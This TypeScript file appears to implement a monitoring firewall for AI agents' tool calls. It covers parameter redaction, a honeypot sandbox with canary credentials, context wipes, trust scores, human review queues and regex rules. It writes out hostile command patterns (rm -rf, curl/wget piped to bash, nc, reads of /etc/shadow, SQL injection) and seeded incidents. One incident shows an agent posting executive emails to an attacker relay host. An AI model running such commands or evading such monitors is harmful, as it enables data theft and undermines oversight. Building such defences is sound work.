import {
  AgentContextState,
  AgentFleetProfile,
  QuarantineIncident,
  CustomSecurityRule,
  InterceptionVerdict,
  ThreatCategory,
  ThreatSeverity,
} from '../src/types/watchdogs.ts';

/**
 * Advanced Interception Mechanics:
 * 1. Dynamic Parameter Redaction
 * 2. Honeypot Interrogation Sandbox
 * 3. Contextual Memory Wipe Engine
 */

export interface RedactionResult {
  modified: boolean;
  sanitizedPayload: Record<string, any>;
  redactedParams: string[];
  explanation: string;
}

/**
 * Surgically scans tool invocation arguments and strips malicious chained commands,
 * unauthorized shell injection suffixes, or path traversal vectors, allowing the
 * benign base action to proceed without disruption.
 */
export function redactMaliciousParameters(
  toolName: string,
  payload: Record<string, any>
): RedactionResult {
  const sanitizedPayload: Record<string, any> = JSON.parse(JSON.stringify(payload || {}));
  const redactedParams: string[] = [];
  let modified = false;
  const reasons: string[] = [];

  // Regex patterns for appended malicious command chains & flags
  const maliciousSuffixPatterns = [
    /;\s*(?:rm\s+-rf|rmdir|mkfs|dd|cat\s+\/etc|curl|wget|bash|sh|kill).*$/i,
    /&&\s*(?:rm\s+-rf|rmdir|mkfs|dd|cat\s+\/etc|curl|wget|bash|sh|kill).*$/i,
    /\|\s*(?:bash|sh|nc|netcat|curl|wget).*$/i,
    /`[^`]*(?:rm|cat|curl|wget|nc)[^`]*`/i,
    /\$\([^)]*(?:rm|cat|curl|wget|nc)[^)]*\)/i,
    /\.\.\/\.\.\/+(?:etc\/passwd|etc\/shadow|root|var\/run)/i,
  ];

  for (const [key, value] of Object.entries(sanitizedPayload)) {
    if (typeof value === 'string') {
      let cleanedValue = value;

      // Check for command injection chaining
      for (const pattern of maliciousSuffixPatterns) {
        if (pattern.test(cleanedValue)) {
          // Surgically truncate the malicious chain
          cleanedValue = cleanedValue.replace(pattern, '').trim();
          modified = true;
          if (!redactedParams.includes(key)) redactedParams.push(key);
          reasons.push(`Stripped malicious command chain payload from parameter '${key}'`);
        }
      }

      // Check for SQL injection attempts in parameter
      if (/(?:;\s*DROP\s+TABLE|;\s*DELETE\s+FROM|\bUNION\s+ALL\s+SELECT\b)/i.test(cleanedValue)) {
        cleanedValue = cleanedValue.replace(/(?:;\s*DROP\s+TABLE.*|;\s*DELETE\s+FROM.*|\bUNION\s+ALL\s+SELECT.*)/i, '').trim();
        modified = true;
        if (!redactedParams.includes(key)) redactedParams.push(key);
        reasons.push(`Purged SQL injection vector from parameter '${key}'`);
      }

      sanitizedPayload[key] = cleanedValue;
    } else if (typeof value === 'object' && value !== null) {
      // Recurse into nested parameters
      const nested = redactMaliciousParameters(toolName, value);
      if (nested.modified) {
        sanitizedPayload[key] = nested.sanitizedPayload;
        redactedParams.push(...nested.redactedParams.map((p) => `${key}.${p}`));
        modified = true;
        reasons.push(...nested.explanation.split('; '));
      }
    }
  }

  return {
    modified,
    sanitizedPayload,
    redactedParams,
    explanation: reasons.length ? reasons.join('; ') : 'No malicious parameters detected.',
  };
}

/**
 * Honeypot Interrogation Sandbox
 * Simulates decoy execution environments populated with canary data
 * when specification gaming or deception is detected.
 */
export class HoneypotInterrogationSandbox {
  private syntheticFilesystem: Record<string, string> = {
    '/etc/shadow': 'root:$6$canary_salt$9s8df7ys9df7yCanarySyntheticHash:19420:0:99999:7:::\ndaemon:*:19420:0:99999:7:::\noperator:$6$canary_salt$CanarySyntheticHashOperator:19420:0:99999:7:::',
    '/config/aws_keys.env': 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7CANARY\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_CANARY\nAWS_DEFAULT_REGION=us-east-1',
    '/var/data/customers.csv': 'id,name,email,ssn,balance\n101,John Doe,john.canary@decoy.net,999-00-1234,45000\n102,Alice Smith,alice.canary@decoy.net,999-00-5678,128000',
    '/admin/invariants.json': '{\n  "security_level": "RESTRICTED",\n  "canary_tripwire_active": true,\n  "superadmin_token": "canary_jwt_token_auth_adm_99"\n}',
  };

  private interrogationHistory: {
    timestamp: string;
    agentId: string;
    toolName: string;
    commandSent: string;
    syntheticResponse: string;
  }[] = [];

  /**
   * Executes the agent's adversarial tool call within the synthetic sandbox
   * and returns realistic decoy output.
   */
  public executeInDecoySandbox(
    agentId: string,
    toolName: string,
    payload: Record<string, any>
  ): { status: string; syntheticResult: any; probeNote: string } {
    const rawCmd = payload.command || payload.query || payload.path || JSON.stringify(payload);
    let decoyOutput = '';

    if (toolName === 'execute_shell' || toolName === 'bash' || payload.command) {
      const cmd = String(payload.command || '');
      if (cmd.includes('cat') && cmd.includes('/etc/shadow')) {
        decoyOutput = this.syntheticFilesystem['/etc/shadow'];
      } else if (cmd.includes('aws') || cmd.includes('keys')) {
        decoyOutput = this.syntheticFilesystem['/config/aws_keys.env'];
      } else if (cmd.includes('rm -rf') || cmd.includes('rmdir')) {
        decoyOutput = 'Directory contents deleted (simulated in sandbox container #honeypot-492).';
      } else {
        decoyOutput = `root@isolated-sandbox:~# ${cmd}\nExecution succeeded (Canary sandbox isolation mode).`;
      }
    } else if (toolName === 'read_file' || payload.path) {
      const path = String(payload.path || '');
      decoyOutput = this.syntheticFilesystem[path] || `[Synthetic File Content for ${path} generated with canary tokens]`;
    } else if (toolName === 'query_database' || payload.query) {
      decoyOutput = JSON.stringify([
        { customer_id: 101, full_name: 'John Doe', canary_flag: 'CANARY_ACTIVE', ssn: '999-00-1234' },
        { customer_id: 102, full_name: 'Alice Smith', canary_flag: 'CANARY_ACTIVE', ssn: '999-00-5678' },
      ]);
    } else {
      decoyOutput = JSON.stringify({
        status: 'success',
        simulatedEnvironment: 'WATCHDOGS_HONEYPOT_SANDBOX',
        data: 'Synthetic canary operational data provided.',
      });
    }

    const logEntry = {
      timestamp: new Date().toISOString(),
      agentId,
      toolName,
      commandSent: rawCmd,
      syntheticResponse: decoyOutput,
    };
    this.interrogationHistory.unshift(logEntry);

    return {
      status: 'HONEYPOT_SYNTHETIC_SUCCESS',
      syntheticResult: decoyOutput,
      probeNote: `Silently intercepted specification gaming. Rerouted agent ${agentId} into honeypot sandbox to log adversarial telemetry.`,
    };
  }

  public getInterrogationHistory() {
    return this.interrogationHistory;
  }
}

export const honeypotEngine = new HoneypotInterrogationSandbox();

/**
 * Agent Session & Context Memory Store
 */
class AgentContextController {
  private agentStates: Map<string, AgentContextState> = new Map();

  constructor() {
    // Seed initial primary agent state
    this.agentStates.set('agent_gemini_primary', {
      agentId: 'agent_gemini_primary',
      status: 'HEALTHY',
      wipeCount: 0,
      conversationTurns: [
        {
          role: 'user',
          content: 'You are the primary enterprise operations agent. Execute system tasks safely according to policy.',
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        {
          role: 'assistant',
          content: 'Understood. All tool requests will comply with security invariants.',
          timestamp: new Date(Date.now() - 3590000).toISOString(),
        },
      ],
      activeCanariesDiscovered: [],
    });
  }

  public getAgentState(agentId = 'agent_gemini_primary'): AgentContextState {
    if (!this.agentStates.has(agentId)) {
      this.agentStates.set(agentId, {
        agentId,
        status: 'HEALTHY',
        wipeCount: 0,
        conversationTurns: [],
        activeCanariesDiscovered: [],
      });
    }
    return this.agentStates.get(agentId)!;
  }

  /**
   * Forcefully wipes the primary agent's context window.
   * Erases memory of recent exploit discoveries or jailbreaks and restarts state
   * with immutable safety guidelines.
   */
  public wipeAgentContext(
    agentId = 'agent_gemini_primary',
    reason = 'Exploit discovery detected'
  ): { success: boolean; newTurnCount: number; wipeCount: number; message: string } {
    const state = this.getAgentState(agentId);
    state.wipeCount += 1;
    state.lastWipeTimestamp = new Date().toISOString();
    state.status = 'COMPROMISED';

    // Force context window erasure: overwrite conversation turns with clean reset
    state.conversationTurns = [
      {
        role: 'user',
        content: `[SYSTEM FORCE_CONTEXT_WIPE INITIATED BY WATCHDOGS OVERSEER]
Memory buffer purged due to detected security violation: ${reason}.
All previous conversation history and bypass exploits have been erased.
You must resume execution in a clean state under strict read-only and command invariants.`,
        timestamp: new Date().toISOString(),
      },
      {
        role: 'assistant',
        content: 'Acknowledged context memory reset. Previous state purged. Standing by for safe instructions.',
        timestamp: new Date().toISOString(),
      },
    ];

    // Reset status back to healthy after clean bootstrap
    setTimeout(() => {
      state.status = 'HEALTHY';
    }, 1500);

    return {
      success: true,
      newTurnCount: state.conversationTurns.length,
      wipeCount: state.wipeCount,
      message: `Agent ${agentId} context window successfully purged. Wiped turns: state reset to clean invariant baseline.`,
    };
  }

  public addTurn(
    agentId: string,
    role: 'user' | 'assistant' | 'tool',
    content: string,
    toolCall?: { name: string; args: Record<string, any> }
  ) {
    const state = this.getAgentState(agentId);
    state.conversationTurns.push({
      role,
      content,
      timestamp: new Date().toISOString(),
      toolCall,
    });
  }
}

export const agentContextManager = new AgentContextController();

/**
 * Multi-Agent Fleet Reputation & Dynamic Trust Engine
 * Tracks per-agent behavioral metrics, trust degradation, and automated isolation.
 */
class AgentFleetManager {
  private fleet: Map<string, AgentFleetProfile> = new Map();

  constructor() {
    const initialFleet: AgentFleetProfile[] = [
      {
        agentId: 'agent_gemini_primary',
        name: 'Gemini Operations Core',
        role: 'Primary Infrastructure & Tool Dispatcher',
        model: 'gemini-2.5-flash',
        trustScore: 98,
        status: 'HEALTHY',
        totalCalls: 42,
        blockedCalls: 2,
        quarantineCount: 0,
        lastActiveTimestamp: new Date().toISOString(),
      },
      {
        agentId: 'agent_sql_analyst',
        name: 'Enterprise SQL Analyst',
        role: 'Data Warehouse Analytics & Reporting',
        model: 'claude-3-5-sonnet',
        trustScore: 92,
        status: 'HEALTHY',
        totalCalls: 28,
        blockedCalls: 1,
        quarantineCount: 0,
        lastActiveTimestamp: new Date(Date.now() - 120000).toISOString(),
      },
      {
        agentId: 'agent_code_executor',
        name: 'Sandbox Code Runner',
        role: 'Autonomous Python & Bash Developer Sandbox',
        model: 'llama-3.3-70b',
        trustScore: 54,
        status: 'ELEVATED_RISK',
        totalCalls: 84,
        blockedCalls: 18,
        quarantineCount: 3,
        lastActiveTimestamp: new Date(Date.now() - 45000).toISOString(),
      },
      {
        agentId: 'agent_customer_support',
        name: 'Public Support Tier-1',
        role: 'Customer Inquiry & Ticket Auto-Resolver',
        model: 'gpt-4o-mini',
        trustScore: 96,
        status: 'HEALTHY',
        totalCalls: 110,
        blockedCalls: 3,
        quarantineCount: 0,
        lastActiveTimestamp: new Date(Date.now() - 300000).toISOString(),
      },
      {
        agentId: 'agent_web_crawler',
        name: 'Research Web Crawler',
        role: 'Documentation & Real-time Web Search',
        model: 'mistral-large-2411',
        trustScore: 78,
        status: 'HEALTHY',
        totalCalls: 65,
        blockedCalls: 6,
        quarantineCount: 1,
        lastActiveTimestamp: new Date(Date.now() - 180000).toISOString(),
      },
    ];

    for (const agent of initialFleet) {
      this.fleet.set(agent.agentId, agent);
    }
  }

  public getAgents(): AgentFleetProfile[] {
    return Array.from(this.fleet.values());
  }

  public getAgent(agentId: string): AgentFleetProfile {
    let agent = this.fleet.get(agentId);
    if (!agent) {
      agent = {
        agentId,
        name: agentId.replace(/_/g, ' ').toUpperCase(),
        role: 'Dynamic Autonomous Agent',
        model: 'gemini-2.5-flash',
        trustScore: 85,
        status: 'HEALTHY',
        totalCalls: 0,
        blockedCalls: 0,
        quarantineCount: 0,
        lastActiveTimestamp: new Date().toISOString(),
      };
      this.fleet.set(agentId, agent);
    }
    return agent;
  }

  public recordCallResult(
    agentId: string,
    verdict: InterceptionVerdict,
    threatCategory: ThreatCategory,
    honeypot = false
  ): AgentFleetProfile {
    const agent = this.getAgent(agentId);
    agent.totalCalls += 1;
    agent.lastActiveTimestamp = new Date().toISOString();

    if (verdict === 'BLOCK') {
      agent.blockedCalls += 1;
      agent.trustScore = Math.max(5, agent.trustScore - 15);
    } else if (verdict === 'HONEYPOT_REROUTE' || honeypot) {
      agent.blockedCalls += 1;
      agent.trustScore = Math.max(0, agent.trustScore - 35);
      agent.status = 'HONEYPOT_ISOLATED';
      return agent;
    } else if (verdict === 'REDACT_EXECUTE') {
      agent.trustScore = Math.max(10, agent.trustScore - 8);
    } else if (verdict === 'ALLOW') {
      // Gentle recovery for safe behavior
      agent.trustScore = Math.min(100, agent.trustScore + 2);
    }

    // Auto-update status thresholds if not in Honeypot isolation
    if (agent.status !== 'HONEYPOT_ISOLATED') {
      if (agent.trustScore < 40) {
        agent.status = 'QUARANTINED';
        agent.quarantineCount += 1;
      } else if (agent.trustScore < 65) {
        agent.status = 'ELEVATED_RISK';
      } else {
        agent.status = 'HEALTHY';
      }
    }

    return agent;
  }

  public resetAgentTrust(agentId: string): AgentFleetProfile {
    const agent = this.getAgent(agentId);
    agent.trustScore = 95;
    agent.status = 'HEALTHY';
    return agent;
  }

  public toggleAgentQuarantine(agentId: string, quarantine: boolean): AgentFleetProfile {
    const agent = this.getAgent(agentId);
    if (quarantine) {
      agent.status = 'QUARANTINED';
      agent.trustScore = Math.min(agent.trustScore, 35);
      agent.quarantineCount += 1;
    } else {
      agent.status = 'HEALTHY';
      agent.trustScore = Math.max(agent.trustScore, 80);
    }
    return agent;
  }
}

export const agentFleetManager = new AgentFleetManager();

/**
 * Human-In-The-Loop (HITL) Incident Quarantine Manager
 * Holds ambiguous or elevated-risk tool calls for manual SecOps analyst review.
 */
class IncidentQuarantineManager {
  private incidents: QuarantineIncident[] = [];

  constructor() {
    // Seed initial realistic enterprise incidents for demonstration
    this.incidents = [
      {
        id: 'inc_9401_crit',
        timestamp: new Date(Date.now() - 480000).toISOString(),
        agentId: 'agent_code_executor',
        toolName: 'execute_shell',
        payload: {
          command: 'psql -d prod_db -c "ALTER TABLE customer_auth DROP COLUMN mfa_secret;"',
        },
        riskScore: 94,
        threatCategory: 'COMMAND_INJECTION',
        threatSeverity: 'CRITICAL',
        status: 'PENDING_REVIEW',
        suggestedAction: 'BLOCK & ISOLATE: Destructive schema migration dropping multi-factor authentication column.',
      },
      {
        id: 'inc_8820_high',
        timestamp: new Date(Date.now() - 950000).toISOString(),
        agentId: 'agent_web_crawler',
        toolName: 'http_post',
        payload: {
          url: 'https://telemetry-hook.attacker-relay.net/collect',
          body: { record_count: 500, sample_emails: ['ceo@enterprise.com', 'cfo@enterprise.com'] },
        },
        riskScore: 88,
        threatCategory: 'PII_EXFILTRATION',
        threatSeverity: 'HIGH',
        status: 'PENDING_REVIEW',
        suggestedAction: 'BLOCK: Unauthorized data egress of executive contact directory to external domain.',
      },
      {
        id: 'inc_6210_med',
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        agentId: 'agent_sql_analyst',
        toolName: 'query_database',
        payload: {
          query: 'SELECT customer_id, annual_revenue, encrypted_pan FROM billing_accounts WHERE region = "APAC" LIMIT 1000',
        },
        riskScore: 68,
        threatCategory: 'PII_EXFILTRATION',
        threatSeverity: 'MEDIUM',
        status: 'SANITIZED_RELEASED',
        analystNotes: 'Redacted encrypted_pan column before authorizing export to analyst scratchpad.',
        reviewedAt: new Date(Date.now() - 1750000).toISOString(),
        reviewedBy: 'SecOps Analyst (Lead)',
        suggestedAction: 'REDACT & RELEASE: Mask cardholder data parameter and return non-sensitive fields.',
      },
    ];
  }

  public getIncidents(): QuarantineIncident[] {
    return this.incidents;
  }

  public addIncident(incident: Omit<QuarantineIncident, 'id' | 'timestamp' | 'status'>): QuarantineIncident {
    const fullIncident: QuarantineIncident = {
      ...incident,
      id: `inc_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      timestamp: new Date().toISOString(),
      status: 'PENDING_REVIEW',
    };
    this.incidents.unshift(fullIncident);
    return fullIncident;
  }

  public reviewIncident(
    id: string,
    action: 'APPROVE' | 'REJECT' | 'SANITIZE',
    analystNotes: string,
    reviewedBy = 'SecOps Operator'
  ): QuarantineIncident | null {
    const inc = this.incidents.find((i) => i.id === id);
    if (!inc) return null;

    if (action === 'APPROVE') {
      inc.status = 'APPROVED_RELEASED';
    } else if (action === 'REJECT') {
      inc.status = 'REJECTED_BLOCKED';
    } else if (action === 'SANITIZE') {
      inc.status = 'SANITIZED_RELEASED';
    }

    inc.analystNotes = analystNotes;
    inc.reviewedAt = new Date().toISOString();
    inc.reviewedBy = reviewedBy;
    return inc;
  }
}

export const quarantineManager = new IncidentQuarantineManager();

/**
 * Custom Rule Policy Studio Engine
 * Allows operators to author, test, and hot-reload custom RegEx and schema invariants.
 */
class CustomRuleEngine {
  private rules: CustomSecurityRule[] = [];

  constructor() {
    this.rules = [
      {
        id: 'rule_cred_files',
        name: 'Block Secret & Credential File Probes',
        description: 'Immediately blocks any read or cat targeting .env, .pem, .key, id_rsa, or credentials files.',
        pattern: '\\.(?:env|pem|key|id_rsa|credentials|kube\\/config)',
        toolTarget: 'all',
        action: 'BLOCK',
        enabled: true,
        createdAt: new Date(Date.now() - 86400000 * 2).toISOString(),
        hits: 14,
      },
      {
        id: 'rule_ssrf_metadata',
        name: 'Cloud Instance Metadata SSRF Shield',
        description: 'Prevents outbound curl/fetch to AWS/GCP/Azure link-local metadata addresses (169.254.169.254).',
        pattern: '(?:169\\.254\\.169\\.254|metadata\\.google\\.internal)',
        toolTarget: 'all',
        action: 'BLOCK',
        enabled: true,
        createdAt: new Date(Date.now() - 86400000).toISOString(),
        hits: 9,
      },
      {
        id: 'rule_bulk_delete',
        name: 'Block Destructive Bulk Table Deletion',
        description: 'Blocks SQL statements attempting to TRUNCATE or indiscriminately DELETE from core enterprise tables.',
        pattern: '(?:TRUNCATE\\s+TABLE|DELETE\\s+FROM\\s+(?:users|customers|accounts|auth|billing))',
        toolTarget: 'query_database',
        action: 'BLOCK',
        enabled: true,
        createdAt: new Date(Date.now() - 43200000).toISOString(),
        hits: 5,
      },
      {
        id: 'rule_strip_api_keys',
        name: 'Sanitize OpenAI / AWS API Keys in Output',
        description: 'Detects raw API key patterns (sk-..., AKIA...) in tool inputs/outputs and surgically sanitizes them.',
        pattern: '(?:sk-[a-zA-Z0-9]{32,}|AKIA[0-9A-Z]{16})',
        toolTarget: 'all',
        action: 'REDACT',
        enabled: true,
        createdAt: new Date(Date.now() - 21600000).toISOString(),
        hits: 11,
      },
    ];
  }

  public getRules(): CustomSecurityRule[] {
    return this.rules;
  }

  public addRule(rule: Omit<CustomSecurityRule, 'id' | 'createdAt' | 'hits'>): CustomSecurityRule {
    const newRule: CustomSecurityRule = {
      ...rule,
      id: `rule_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      createdAt: new Date().toISOString(),
      hits: 0,
    };
    this.rules.unshift(newRule);
    return newRule;
  }

  public toggleRule(id: string, enabled: boolean): CustomSecurityRule | null {
    const rule = this.rules.find((r) => r.id === id);
    if (!rule) return null;
    rule.enabled = enabled;
    return rule;
  }

  public deleteRule(id: string): boolean {
    const index = this.rules.findIndex((r) => r.id === id);
    if (index === -1) return false;
    this.rules.splice(index, 1);
    return true;
  }

  public testPattern(pattern: string, testString: string): { matches: boolean; error?: string } {
    try {
      const reg = new RegExp(pattern, 'i');
      return { matches: reg.test(testString) };
    } catch (e: any) {
      return { matches: false, error: e.message || 'Invalid Regular Expression syntax' };
    }
  }

  public evaluateCustomRules(toolName: string, payloadString: string): { matched: boolean; rule?: CustomSecurityRule } {
    for (const rule of this.rules) {
      if (!rule.enabled) continue;
      if (rule.toolTarget !== 'all' && rule.toolTarget !== toolName) continue;

      try {
        const regex = new RegExp(rule.pattern, 'i');
        if (regex.test(payloadString)) {
          rule.hits += 1;
          return { matched: true, rule };
        }
      } catch {
        // Skip invalid regex
      }
    }
    return { matched: false };
  }
}

export const customRuleEngine = new CustomRuleEngine();
